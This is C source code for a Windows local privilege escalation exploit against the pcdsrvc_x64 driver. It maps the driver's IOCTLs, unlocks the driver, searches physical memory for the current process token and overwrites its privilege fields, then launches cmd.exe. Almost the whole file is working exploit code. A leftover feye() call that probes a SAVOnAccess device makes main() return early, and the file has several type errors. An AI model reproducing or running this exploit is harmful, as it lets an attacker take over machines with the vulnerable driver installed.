#include "stdafx.h"
#include <Windows.h>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")

SIZE_T GetProcessToken();

typedef struct _SYSTEM_HANDLE
{
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION // Size=20
{
	ULONG NumberOfHandles; // Size=4 Offset=0
	SYSTEM_HANDLE Handles[1]; // Size=16 Offset=4
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

// pcdsrvc driver ioctls
// 0x222004 = driver activation ioctl
// 0x222314 = IoDriver::writePortData
// 0x22230c = IoDriver::writePortData
// 0x222304 = IoDriver::writePortData
// 0x222300 = IoDriver::readPortData
// 0x222308 = IoDriver::readPortData
// 0x222310 = IoDriver::readPortData
// 0x222700 = EcDriver::readData
// 0x222704 = EcDriver::writeData
// 0x222080 = MemDriver::getPhysicalAddress
// 0x222084 = MemDriver::readPhysicalMemory
// 0x222088 = MemDriver::writePhysicalMemory
// 0x222180 = Msr::readMsr
// 0x222184 = Msr::writeMsr
// 0x222104 = PciDriver::readConfigSpace
// 0x222108 = PciDriver::writeConfigSpace
// 0x222110 = PciDriver::?
// 0x22210c = PciDriver::?
// 0x222380 = Port1394::doesControllerExist
// 0x222384 = Port1394::getControllerConfigRom
// 0x22238c = Port1394::getGenerationCount
// 0x222388 = Port1394::forceBusReset
// 0x222680 = SmbusDriver::genericRead
// 0x222318 = SystemDriver::readCmos8
// 0x22231c = SystemDriver::writeCmos8
// 0x222600 = SystemDriver::getDevicePdo
// 0x222604 = SystemDriver::getIntelFreqClockCounts
// 0x222608 = SystemDriver::getAcpiThermalZoneInfo

//
// @dronesec pcdrsvc_x64 LPE
// uses a variation of rewolf's EPROCESS hunting. Instead of searching for pool tags, we fetch the 
// virtual address of our token then hunt for it in physical mem by identifying the address byte index
// and TokenLuid. We then enable all privileges on the token.
//
// The MSR read/write ioctls are also interesting, but likely a bit trickier to exploit on Win10 without arb write
// 

#define DRIVER_UNLOCK		0x222004
#define MEM_GETPHYSICAL		0x222080
#define MEM_READPHYSICAL	0x222084
#define MEM_WRITEPHYSICAL	0x222088

SIZE_T TokenId = 0x0;

typedef struct _MEMORY_OP
{
	SIZE_T PhysicalAddress;
	unsigned int BufferLength;
	char DoWrite;
	unsigned char Payload[8];
} MEMORY_OP;

// the driver won't work without an unlock ioctl first (lol)
BOOL UnlockDriver(HANDLE hDriver)
{
	BOOL bResult;
	DWORD dwRet;
	SIZE_T code = 0xA1B2C3D4, outBuf;

	// ioctl doesn't actually return anything, but the out buffer size MUST be >= 4
	bResult = DeviceIoControl(hDriver, DRIVER_UNLOCK, &code, sizeof(SIZE_T), &outBuf, sizeof(SIZE_T), &dwRet, NULL);
	return bResult;
}

// write to the specified physical address
DWORD WritePhysicalMem(HANDLE hDriver, MEMORY_OP mw)
{
	SIZE_T getAddr, outAddr, TokenAddr;
	BOOL bResult;
	DWORD dwRetBytes, dwToken;

	DeviceIoControl(hDriver,
		MEM_WRITEPHYSICAL,
		&mw,
		sizeof(MEMORY_OP),
		0,
		0,
		&dwRetBytes,
		0);

	if (bResult)
		printf("Wrote %d bytes\n", dwRetBytes);
	else
		printf("Failed write: %d\n", GetLastError());

	return dwRetBytes > 0;
}

// read out a hunk of memory
LPVOID ReadBlockMem(HANDLE hDriver, SIZE_T uPhysicalAddr, SIZE_T uBlockSize)
{
	MEMORY_OP mw;
	LPVOID lpOutBuf;
	DWORD dwRval;

	if (uBlockSize > 0x20000000)
		return NULL;

	lpOutBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uBlockSize);

	mw.PhysicalAddress = uPhysicalAddr;
	mw.BufferLength = uBlockSize;
	mw.DoWrite = 0;

	if (!DeviceIoControl(hDriver,
		MEM_READPHYSICAL,
		&mw,
		sizeof(MEMORY_OP),
		lpOutBuf,
		uBlockSize,
		&dwRval,
		0)) {
		printf("Reading failed: %d\n", GetLastError());
		return;
	}

	printf("Returned %d bytes\n", dwRval);
	return lpOutBuf;
}

// populate token id
DWORD FetchTokenId()
{
	PTOKEN_STATISTICS tokenstat;
	HANDLE hToken;
	DWORD dwSize;
	
	OpenProcessToken(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()), TOKEN_ALL_ACCESS, &hToken);
	
	GetTokenInformation(hToken, TokenStatistics, 0, 0, &dwSize);
	tokenstat = (PTOKEN_STATISTICS)malloc(dwSize);
	GetTokenInformation(hToken, TokenStatistics, tokenstat, dwSize, &dwSize);

	TokenId = tokenstat->TokenId.LowPart;
	printf("Token LUID is %08x\n", TokenId);
	
	CloseHandle(hToken);
	free(tokenstat);
}

// search through physical mem for our token
SIZE_T FindTokenAddress(HANDLE hDriver, SIZE_T VirtualAddress)
{
	SIZE_T uStartAddr = 0x10000000, hTokenAddr = 0x0;
	LPVOID lpMemBuf;

	printf("Token Virtual: %10x\n", VirtualAddress);

	// iterate over VA byte index
	uStartAddr = uStartAddr + (VirtualAddress & 0xfff);

	for (USHORT chunk = 0; chunk < 0xb; ++chunk) {
		lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
		for(SIZE_T i = 0; i < 0x10000000; i += 0x1000, uStartAddr += 0x1000){
			if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){
				
				// we've got a user token with the same byte index, check the TokenID to confirm
				if (TokenId <= 0x0)
					FetchTokenId();

				if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
					hTokenAddr = uStartAddr;
					break;
				}
			}
		}

		HeapFree(GetProcessHeap(), 0, lpMemBuf);

		if (hTokenAddr > 0x0)
			break;
	}

	return hTokenAddr;
}

// get the virtual of our token
SIZE_T GetHandleAddress(ULONG dwProcessId, SIZE_T hObject)
{
	DWORD dwHandleSize = 4096 * 16 * 16;
	BYTE* HandleInformation;
	DWORD BytesReturned;
	ULONG i;

	HandleInformation = (BYTE*)malloc(dwHandleSize);

	// Get handle information
	while (NtQuerySystemInformation(16, HandleInformation, dwHandleSize, &BytesReturned) != 0) 
		HandleInformation = (BYTE*)realloc(HandleInformation, dwHandleSize *= 2);

	// Find handle
	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)HandleInformation;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO CurrentHandle = &HandleInfo->Handles[0];

	for (i = 0; i<HandleInfo->NumberOfHandles; CurrentHandle++, i++)
	{
		if (CurrentHandle->UniqueProcessId == dwProcessId &&
			CurrentHandle->HandleValue == (SIZE_T)hObject)
		{
			return CurrentHandle->Object;
		}
	}

	return NULL;
}

SIZE_T GetProcessToken()
{
	SIZE_T dwToken;
	HANDLE hToken;

	if (!OpenProcessToken(OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()), TOKEN_QUERY | TOKEN_QUERY_SOURCE, &hToken)){
		printf("[-] Failed to get token!\n");
		return -1;
	}

	dwToken = (SIZE_T)hToken & 0xffff;
	dwToken = GetHandleAddress(GetCurrentProcessId(), dwToken);

	return dwToken;
}

void feye()
{
	LPCSTR lpDeviceName = (LPCSTR)"\\\\.\\SAVOnAccess";
	HANDLE hDriver;

	hDriver = CreateFileA(lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to open handle: %08x\n", GetLastError());
		return -1;
	}

	printf("Got handle!\n");


	CloseHandle(hDriver);
}

int main()
{
	feye();
	return;
	LPCSTR lpDeviceName = (LPCSTR)"\\\\.\\PCDSRVC{3B54B31B-D06B6431-06020200}_0";
	//LPCSTR lpDeviceName = (LPCSTR)"\\\\.\\pcdsrvc_x64";
	HANDLE hDriver;
	unsigned char *TokenPrivs = 0x0000000602980000; // default privs + SeDebugPrivilege
	LPVOID lpBuf, lpOutBuf;
	BOOL bResult;
	DWORD dwRetBytes, dwToken;
	
	hDriver = CreateFileA(lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to open handle: %08x\n", GetLastError());
		return -1;
	}

	printf("Enabling driver...\n");
	if (!UnlockDriver(hDriver))
	{
		printf("Failed to unlock driver!\n");
		CloseHandle(hDriver);
		return 0;
	}

	SIZE_T uVTokenAddr = GetProcessToken();
	SIZE_T uPTokenAddr = FindTokenAddress(hDriver, uVTokenAddr);
	if (uPTokenAddr <= 0x0)
		return -1;

	printf("Virtual: %10x\n", uVTokenAddr);
	printf("Physical: %10x\n", uPTokenAddr);
	printf("Physical offset @ %08x\n", uPTokenAddr + 0x40);
	
	// perform two 8 byte writes on the enable/default fields of the token

	MEMORY_OP mw;
	mw.BufferLength = sizeof(SIZE_T);
	mw.DoWrite = 4;
	mw.PhysicalAddress = uPTokenAddr + 0x40; // default
	memcpy(mw.Payload, &TokenPrivs, sizeof(mw.Payload));

	WritePhysicalMem(hDriver, mw);

	mw.PhysicalAddress = uPTokenAddr + 0x48; // enabled
	WritePhysicalMem(hDriver, mw);

	system("cmd.exe");
	return 0;
}